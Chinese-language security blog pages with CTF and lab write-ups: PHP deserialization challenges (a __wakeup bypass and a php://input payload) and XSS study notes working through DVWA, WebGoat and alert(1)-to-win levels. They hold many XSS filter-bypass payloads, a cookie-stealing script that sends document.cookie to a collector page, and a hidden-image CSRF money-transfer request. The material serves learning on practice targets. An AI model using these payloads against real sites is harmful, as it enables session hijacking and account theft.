<p>代码审计可知我们需要绕过__wakeup()函数。</p>
<p> 我们首先根据题目源码构造序列化代码。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200114190910.png" alt=""></p>
<p>这里利用到了一个 __wakeup()函数的漏洞（CVE-2016-7124）。</p>
<p><strong>一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，可以用来绕过；</strong></p>
<p>得到的序列化字符串为：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
<p>括号前的数字即为属性值,所以将其修改后传入url中即可获得flag。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200114191751.png" alt=""></p>
<h5 id="Bugku-CTF-php伪协议-amp-反序列化"><a href="#Bugku-CTF-php伪协议-amp-反序列化" class="headerlink" title="Bugku CTF (php伪协议&amp;反序列化)"></a>Bugku CTF (php伪协议&amp;反序列化)</h5><p>首先我们根据源码提示，利用php伪协议得到反序列化相关代码。</p>
<img src="QQ截图20200114195646.png" style="zoom:67%;" />

<img src="QQ截图20200114195734.png" style="zoom:67%;" />

<p>这里看到了<strong>__string</strong>魔术方法：作用为将flag类作为字符串执行时会自动执行此函数。</p>
<p>在index.php又发现了关键函数unserialize();正则匹配函数preg_match对flag进行了匹配。</p>
<p>由于过滤不能通过文件包含的方式读取flag。但是我们可以自由的传入password的值。</p>
<p>所以我们就可以构造序列化对象：变量file=flag.php，传给password</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200114201936.png" alt=""></p>
<p>构造payload:</p>
<pre><code>?txt=php://input&amp;file=hint.php&amp;passwordO:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>即可得到flag.</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://blog.szfszf.top/article/24/" target="_blank" rel="noopener">https://blog.szfszf.top/article/24/</a></p>
<p><a href="https://www.smi1e.top/php反序列化攻击拓展/" target="_blank" rel="noopener">https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/</a></p>
<p><a href="https://www.freebuf.com/column/154530.html" target="_blank" rel="noopener">https://www.freebuf.com/column/154530.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/xss-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/xss-lou-dong-xue-xi/" itemprop="url">XSS漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:46:48+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
<h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
<h5 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h5><ul>
<li>非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</li>
<li>持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</li>
<li>DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</li>
</ul>
<h5 id="XSS漏洞常见危害"><a href="#XSS漏洞常见危害" class="headerlink" title="XSS漏洞常见危害"></a>XSS漏洞常见危害</h5><ul>
<li>盗用cookie，获取敏感信息。（最常见）</li>
<li>劫持会话，执行任意操作（改密码、留言等CSRF)</li>
<li>强制弹出广告页面，刷广告流量</li>
<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
<li>钓鱼，获取用户账号，密码</li>
<li>网页挂马，挖矿</li>
</ul>
<h5 id="关于JavaScript"><a href="#关于JavaScript" class="headerlink" title="关于JavaScript"></a>关于JavaScript</h5><ul>
<li>JavaScript是一种客户端的脚本语言，是运行的浏览器中的</li>
<li>浏览器会自动运行网页中的JavaScript代码，并且JavaScript代码对于用户来说是透明的</li>
</ul>
<p>网页中运行JavaScript的方式</p>
<p>1.引入外部js</p>
<pre><code>&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&lt;/script&gt;</code></pre><p>2.使用超链接（javascript伪协议）</p>
<pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>3.使用标签</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>4.使用事件方法</p>
<pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><p>常见事件：</p>
<table>
<thead>
<tr>
<th align="center">事件名称</th>
<th align="center">类型</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onerror</td>
<td align="center">window事件属性</td>
<td align="center">在错误发生时运行的脚本</td>
</tr>
<tr>
<td align="center">onload</td>
<td align="center">window事件属性</td>
<td align="center">页面加载结束以后运行脚本</td>
</tr>
<tr>
<td align="center">onclick</td>
<td align="center">Mouse事件</td>
<td align="center">元素上发生鼠标点击时触发</td>
</tr>
<tr>
<td align="center">onmouseover</td>
<td align="center">Mouse事件</td>
<td align="center">当鼠标指针移动到元素上时触发</td>
</tr>
<tr>
<td align="center">oninput</td>
<td align="center">From事件</td>
<td align="center">当元素获得用户输入时运行的脚</td>
</tr>
</tbody></table>
<h5 id="探测XSS过程"><a href="#探测XSS过程" class="headerlink" title="探测XSS过程"></a>探测XSS过程</h5><p>1.构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</p>
<p>   例如：hacker</p>
<p>2.使用浏览器审查工具进行代码审计，寻找构造的字符串是否在页面中显示。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201183252.png" style="zoom:50%;" />



<h5 id="xss常用的测试语句"><a href="#xss常用的测试语句" class="headerlink" title="xss常用的测试语句"></a>xss常用的测试语句</h5><ul>
<li><script>alert(1)</script>
</li>
<li><p><code>&lt;imgsrc=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&amp;#59&quot;&gt;</code>//转换为10进制</p>
</li>
<li><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p>
</li>
<li><p><code>&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;</code></p>
</li>
<li><a href=javascript:alert(1)>
</li>
<li><script>alert(document.cookie)</script>
</li>
<li><script>window.location="(黑页地址)";</script> 

<p>document.body.innerHTML=”<div style=visblity:visble;><h1></p>
</li>
</ul>
<h3 id="DVWA-XSS-部分"><a href="#DVWA-XSS-部分" class="headerlink" title="DVWA( XSS 部分)"></a>DVWA( XSS 部分)</h3><h4 id="XSS（reflect"><a href="#XSS（reflect" class="headerlink" title="XSS（reflect)"></a>XSS（reflect)</h4><p><strong>simple:</strong></p>
<p>尝试发现输入的语句直接插入到标签中</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop~31370AWY0@A%5D%%5BZYLQ8I%5BI.png" alt=""></p>
<p>直接使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>尝试，发现成功弹窗。</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112112615.png" style="zoom: 33%;" />

<p>分析源码：</p>
<img src="C:\Users\尚慧亮\Desktop\5M26R`@5UXK[OQGO{ZMHYD2.png" style="zoom: 50%;" />

<p>代码只判断了name值是否为空。没有做任何过滤。</p>
<p><strong>尝试盗取cookie:</strong></p>
<p>在本地网站根目录新建cookie.php和cookie.txt。</p>
<p>cookie.php内容为</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124443.png" style="zoom: 50%;" />

<p>回到dvwa中构造攻击语句：</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://127.0.0.1/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<p>得到cookie:</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124855.png" style="zoom:33%;" />

<p>回到DVWA的登录界面：</p>
<p>在火狐浏览器的控制台中编辑cookie重新发包：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112125154.png" style="zoom:50%;" />

<p>访问index.php发现成功以被攻击者身份登录。</p>
<p><strong>medium:</strong></p>
<p>首先尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>  发现<script>标签被过滤。</p>
<p>分析源码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112114020.png" alt=""></p>
<p>代码使用 "str_replace"函数将<script>标签替换为空，且该函数是大小写敏感。我们可以采用多种方式绕过。</p>
<p>1.大小写绕过：<SCRIPT>alert(1)</SCRIPT></p>
<p>2.双写绕过：&lt;<script>script>alert(1)<</script>/script&gt;</p>
<p>3.利用img标签进行绕过：<code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
<p> <strong>PS:  onerror事件会在文档或图像加载过程中发生错误时被触发</strong></p>
<p>  <strong>因为src=x就是一个错误代码，所以触发事件执行</strong></p>
<p><strong>high</strong>:</p>
<p>尝试<script>alert(1)</script> 无效。</p>
<p>再次尝试<code>&lt;img src=1 onerror=alert(1)&gt;</code>  成功。</p>
<p>同样可以使用：<code>&lt;iframe onload=alert(1)&gt;</code></p>
<p><strong>PS:<iframe>标签可以在一个html代码中嵌入另一个html内容</strong></p>
<p>​      <strong>onload 是js的一个事件，事件会在页面加载完成后，立即发生，同时执行被调用的程序。</strong></p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112114820.png" style="zoom:33%;" />

<p>分析源码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112115042.png" alt=""></p>
<p><strong>impossible:</strong></p>
<p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>发现语句被原封不动输出。</p>
<p>查看后台代码：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112130818.png" style="zoom: 50%;" />

<p>引用博客大佬解释：</p>
<p>利用PHP函数<code>htmlspecialchars()</code>实现将特殊字符（逻辑与符号<code>&amp;</code>、双引号<code>&quot;</code>、单引号<code>&#39;</code>、小于号<code>&lt;</code>、大于号<code>&gt;</code>）转换为 HTML 实体，从而使得浏览器不解析其作为html元素构造脚本来执行，只是作为普通输入的字符来显示。</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141718.png" style="zoom: 67%;" />



<h4 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS DOM"></a>XSS DOM</h4><p><strong>DOM xss产生的原因：</strong></p>
<p>​         DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞<br><strong>常用 xss DOM属性：</strong></p>
<p>document.referer</p>
<p>window.name</p>
<p>location</p>
<p>innerHTML</p>
<p>document.write</p>
<p>simple:</p>
<p>查看后台代码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112131409.png" alt="">  </p>
<p> 什么都没有做。。。</p>
<p>随便选择一种语言：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132346.png" alt=""></p>
<p>我们可以在之后接入我们想要执行的代码：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>成功弹窗：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112132515.png" style="zoom:33%;" />

<p> 火狐查看页面元素：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132558.png" alt=""></p>
<p><strong>medium:</strong></p>
<p>查看后台代码：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112133547.png" style="zoom: 50%;" />

<p>代码使用了stripos函数过滤了<strong>&lt;script</strong>.并且不区分大小写。</p>
<p>我们可以使用<code>&lt;img src=1 onerror=1&gt;</code>绕过</p>
<p>我们查看页面源码：</p>
<option value='    "+lang+"      '> "  +decodeURl(lang) +  " </option>

<p>我们的目的是让语句插入option标签的值中进而执行。</p>
<p>直接插入：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112134126.png" alt=""></p>
<p>尝试闭合前面<option><select>标签</p>
<p>插入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code>成功</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112134639.png" style="zoom:33%;" />

<p><strong>high:</strong></p>
<p>查看后台代码</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112134821.png" style="zoom: 67%;" />

<p>白名单过滤，只允许传指定的default值。</p>
<p><strong>补充知识：url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤</strong></p>
<p>构造攻击代码：</p>
<p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112140826.png" style="zoom: 33%;" />

<p><strong>impossible:</strong></p>
<p>后台代码:</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141157.png" style="zoom: 50%;" />

<p>注释里说保护的代码在客户端的里面。</p>
<p>我们尝试构造语句<script>alert(1)</script>发现没有任何反应。</p>
<p>我们查看源代码：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141405.png" style="zoom: 80%;" />

<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112141418.png" alt=""></p>
<p>发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p>
<h4 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS (stored)"></a>XSS (stored)</h4><p><strong>simple:</strong></p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112142234.png" style="zoom:33%;" />

<p>出现一个留言框，直接在name中输入发现有字数限制，</p>
<p>直接使用火狐对页面元素进行修改。修改maxlength</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142128.png" alt=""></p>
<p>或者使用burp抓包绕过前端限制。</p>
<p><strong>medium:</strong></p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142934.png" alt=""></p>
<p>str_replace():含有“<script>”的字符串替换为空</p>
<p>addslshes():函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>htmlspecialchars():函数把预定义的字符转换为HTML实体。</p>
<p>message防注入基本天衣无缝。。。。。</p>
<p>但是我们仍然可以通过name栏进行注入。</p>
<p>构造攻击语句：</p>
<p><code>&lt;Script&gt;document.location=&#39;http://127.0.0.1/1.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
<h3 id="Webgoat-靶场-xss-部分"><a href="#Webgoat-靶场-xss-部分" class="headerlink" title="Webgoat 靶场 xss(部分)"></a>Webgoat 靶场 xss(部分)</h3><p><strong>stage 1: strored XSS</strong></p>
<ol>
<li>作为Tom，在个人简介编辑页执行存储型XSS攻击，验证Jerry会受到攻击影响。</li>
<li>使用Tom登录，修改Tom的个人简介编辑页的街道一栏，在其后添加,更新个人信息</li>
</ol>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112164709.png" style="zoom: 50%;" />

<p>3.使用Jerry登录，选择Tom的个人信息进行查看，弹窗表明存储型XSS攻击成功。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112164941.png" style="zoom:50%;" />

<p><strong>Stage3:Stored XSS Revisited</strong></p>
<p>验证Bruce的个人简历中包含有XSS攻击，使用David用户登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112165159.png" style="zoom:50%;" />

<p><strong>Stage5:Reflected XSS</strong></p>
<p>1.利用查找职工页面的缺陷制作一个包含有反射型XSS的URL，验证其他使用这个链接的用户也会受到攻击影响。</p>
<p>2.使用用户Larry登录，在Search Staff搜索框中输入恶意代码。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170452.png" style="zoom: 50%;" />

<p>使用tom登录查看搜素界面无法正常显示：</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170527.png" style="zoom:50%;" />

<h5 id="Stored-XSS-Attacks"><a href="#Stored-XSS-Attacks" class="headerlink" title="Stored XSS Attacks"></a><strong>Stored XSS Attacks</strong></h5><p>清除所有的输入是一个很好的选择，尤其是清除那些将被用作参数使用的输入。对于在应用程序中永久存储的内容特别重要。当用户的消息被检索时，不能出现不期望的消息内容。</p>
<p>在输入的内容中添加javascript代码，点击Submit按钮。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171509.png" style="zoom:50%;" />

<p>点击我们刚刚创建好的帖子，触发xss</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171526.png" style="zoom:50%;" />

<h5 id="Reflected-XSS-Attacks"><a href="#Reflected-XSS-Attacks" class="headerlink" title="Reflected XSS Attacks"></a>Reflected XSS Attacks</h5><p> 在服务器端验证所有输入是一个很好的选择。未验证的用户输入可能会在HTTP响应中出现XSS。攻击者可以创建一个URL，通过让受害者点击的方式进行XSS攻击。</p>
<p>在digit access code框中添加攻击代码：</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112172146.png)0</p>
<p><strong>Cross Site Request Forgery (CSRF)</strong></p>
<p>​       在这一课中，您的目的是向一个新闻组发送一封邮件，邮件中包含一张图片，这个图像 的URL指向一个恶意请求。尝试一个包括1*1像素的图像，其中包含一个网址。这个URL 应当用一个额外的参数“transferFunds= 4000”指向CRSF课程页面。您可以通过左侧菜单在 CSRF课程连接上右键单击，选择复制快捷方式。无论谁收到这封邮件，并恰好已经通过身份验证，他的资金将会被转走。 <br>    注意:不同WebGoat环境的 URL中“Screen”和“Menu”参数可能会有所区别。注意使 用您但前访问URL中正在使用的参数。  </p>
<p>我们需要创建一个图片，链接到一个网站，格式如下：</p>
<p><code>&lt;img src=&quot;http://192.168.1.149/WebGoat/attack?Screen=52&amp;menu=900&amp;transferFunds=5000&quot; width=&quot;1&quot;height=&quot;1&quot;/&gt;</code></p>
<p>创建后提交</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112173529.png" style="zoom:50%;" />

<p>点击刷新即可通关。</p>
<h3 id="XSS——alert-1-to-win"><a href="#XSS——alert-1-to-win" class="headerlink" title="XSS——alert(1)to win"></a>XSS——alert(1)to win</h3><p><strong>Warmup</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码直接拼接了输入的字符串，没有进行任何有效的过滤，我们尝试闭合即可。</p>
<p>")闭合前面的双引号和括号，后面使用// 或<!--注释“</p>
<p>尝试：<code>&quot;);alert(1) //</code>成功</p>
<p>也可以闭合前面的<script>标签</p>
<p>尝试:<code>&lt;/script&gt;;&lt;script&gt;alert(1)&lt;!--</code>成功</p>
<p><strong>Adobe</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码将输入的双引号用\进行了转义，所以无法通过进行双引号的闭合。</p>
<p>但我们还可以通过<script>标签闭合绕过。</p>
<p>或者在输入的双引号前在加一个\对转义双引号的\进行转义。如下：</p>
<p>尝试<code>\&quot;);alert(1)//</code></p>
<p><strong>JSON</strong></p>
<pre><code>function escape(s) {
  s = JSON.stringify(s);
  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;/script&gt;&#39;;
}</code></pre><p>JSON 通常用于与服务端交换数据。</p>
<p>在向服务器发送数据时一般是字符串。</p>
<p>我们可以使用 JSON.stringify() 方法将 JavaScript 对象转换为字符串。</p>
<p>过滤了,"等字符。</p>
<p>尝试<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code>成功</p>
<p><strong>Markdown</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> text <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// URLs</span>
    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(http:\/\/\S+)/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;a href="$1">$1&lt;/a>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// [[img123|Description]]</span>
    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[\[(\w+)\|(.+?)\]\]/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;img alt="$2" src="$1.gif">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> text<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>s.replace将<strong>< "</strong>转换成立HTML实体</p>
<p>text.replace意思为判断输入中是否含有http://,如果有就生成一个a标签,</p>
<p>第三波，如果字符串包含<code>[[img_src|img_alt]]</code>格式的字符串，则变为</p>
<p><code>&lt;img alt=&quot;img_alt&quot; src=&quot;img_src.gif&quot;&gt;</code></p>
<p><strong>Fruit</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// CVE-2016-4618</span>
<span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">createHTMLDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> s<span class="token punctuation">;</span>
  <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'SCRIPT'</span> <span class="token operator">===</span> n<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> n<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> name <span class="token operator">=</span> n<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!==</span> <span class="token string">'class'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> n<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> div<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码给出了漏洞编号,查了一下得知；</p>
<p>问题来源于代码的逻辑不严谨，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p>
<p><code>&lt;iframe t onload=alert(1)&gt;</code></p>
<h3 id="小迪XSS靶场"><a href="#小迪XSS靶场" class="headerlink" title="小迪XSS靶场"></a>小迪XSS靶场</h3><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>我们需要闭合前面的文本标签</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201205424.png" style="zoom:50%;" />

<h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>过滤了圆括号(),但是我们仍然可以使用反引号执行.</p>
<p><code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></p>
